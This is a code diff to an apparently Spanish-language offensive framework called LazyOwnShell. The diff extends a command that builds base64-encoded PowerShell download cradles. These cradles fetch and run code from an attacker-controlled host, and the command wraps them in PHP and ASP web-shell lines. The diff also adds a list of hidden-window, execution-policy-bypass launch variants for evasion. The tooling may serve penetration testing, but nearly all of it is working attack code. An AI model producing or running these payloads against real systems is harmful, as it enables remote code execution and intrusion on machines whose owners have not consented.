@@ -7518,24 +7518,51 @@ class LazyOwnShell(cmd2.Cmd):
         if not lhost:
             print_error(f"lhost debe estar seteado. Ej: set lhost 10.10.10.10")
             return
-        if not line:
-            print_error(
-                f"Debes pasar el nombre del archivo o el comando. Ejemplo: {GREEN}winbase64payload payload.ps1"
-            )
-            return
+        
+        payload_type = input("    [!] Enter kind payload (1: ps1, 2: wget, 3: Free): ").strip()
+        
+        if not line and payload_type != "3":
+            excluded_extensions = ['.html', '.xml', '.nmap', '.dot', '.png', '.xsl', '.txt', '.json']
+            file_list = []
+            for root, dirs, files in os.walk("sessions"):
+                for file in files:
+                    if not any(file.endswith(ext) for ext in excluded_extensions):
+                        file_list.append(os.path.join(root, file))
+            
+            if not file_list:
+                print_error("No files found in the sessions directory.")
+                return
+    
+            print_msg("Select a file to download:")
+            for idx, file in enumerate(file_list, 1):
+                print_msg(f"  {idx}) {file}")
 
-        payload_type = input("    [!] Tipo de payload (1: ps1, 2: wget): ").strip()
+            file_choice = input(f"    [!] Enter the number of the file (1-{len(file_list)}): ").strip()
+            
+            try:
+                file_choice = int(file_choice)
+                if file_choice < 1 or file_choice > len(file_list):
+                    print_warn("Invalid choice.")
+                    return
+                selected_file = file_list[file_choice - 1]
+            except ValueError:
+                print_error("Invalid input. Please enter a number.")
+                return        
+        else:
+            selected_file = line.strip()
+
         if payload_type == '1':
-            command = f"IEX(New-Object Net.WebClient).downloadString('http://{lhost}/{line}')"
+            command = f"IEX(New-Object Net.WebClient).downloadString('http://{lhost}/{selected_file}')"
         elif payload_type == '2':
-            command = f"wget http://{lhost}/{line} -o C:\\Windows\\TEMP\\{line.split('/')[-1]}"
+            command = f"wget http://{lhost}/{selected_file} -o C:\\Windows\\TEMP\\{selected_file.split('/')[-1]}"
+        elif payload_type == '3':
+            command = input("    [!] Enter personalized command (default: whoami): ") or 'whoami'
         else:
             print_error(f"Tipo de payload no válido: {payload_type}")
             return
 
         output_type = input("    [!] Tipo de salida (1: PowerShell, 2: ASP, 3: PHP): ").strip()
 
-        # Encode command to UTF-16LE and then to base64
         utf16_command = command.encode('utf-16le')
         base64_command = base64.b64encode(utf16_command).decode('utf-8')
 
@@ -7544,13 +7571,37 @@ class LazyOwnShell(cmd2.Cmd):
         elif output_type == '2':
             final_command = f"<%= `powershell /enc {base64_command}` %>"
         elif output_type == '3':
-            final_command = f"<?php echo `powershell /enc {base64_command}`; ?>"
+            final_command = f"<?php system(`powershell /enc {base64_command}`); ?>"
         else:
             print_error(f"Tipo de salida no válido: {output_type}")
             return
-
+        choice = input("   [?] Do you wanna see more payloads (y/n)") or "n"
+        if choice == "y":
+            payloads = f"""
+            cmd.exe /c powershell.exe -ExecutionPolicy ByPass -WindowStyle Hidden -Enco {base64_command}
+            cmd.exe /c powershell.exe -ExecutionPolicy ByPass /Window Hi -Enco {base64_command}
+            cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowSty H -Enco {base64_command}
+            cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowSty Hid -Enco {base64_command}
+            cmd.exe /c powershell.exe -ExecutionPolicy ByPass /W Hi -Enco {base64_command}
+            cmd.exe /c powershell.exe -ExecutionPolicy ByPass -W H -Enco {base64_command}
+            cmd.exe /c powershell.exe -ExecutionPolicy ByPass -W Hi -Enco {base64_command}
+            cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowSty Hidd -Enco {base64_command}
+            cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowS Hidden -Enco {base64_command}
+            cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowSt Hidde -Enco {base64_command}
+            cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowS H -Enco {base64_command}
+            cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowSty Hidde -Enco {base64_command}
+            cmd.exe /c powershell.exe -ExecutionPolicy ByPass -Wind Hidde -Enco {base64_command}
+            cmd.exe /c powershell.exe -ExecutionPolicy ByPass -Win Hid -Enco {base64_command}
+            cmd.exe /c powershell.exe -ExecutionPolicy ByPass -WindowSt Hidd -Enco {base64_command}
+            cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowStyle Hidde -Enco {base64_command}
+            cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowS Hidde -Enco {base64_command}
+            cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowSty Hid -Enco {base64_command}
+            cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowSty Hi -Enco {base64_command}
+            """
+            print_msg("Another options to payloads: ")
+            print_msg(f"\n\n {payloads} \n\n")
         copy2clip(final_command)
-        print_msg(f"Comando base64 generado y copiado al portapapeles:\n{final_command}")
+        
         return
 
     def do_revwin(self, line):
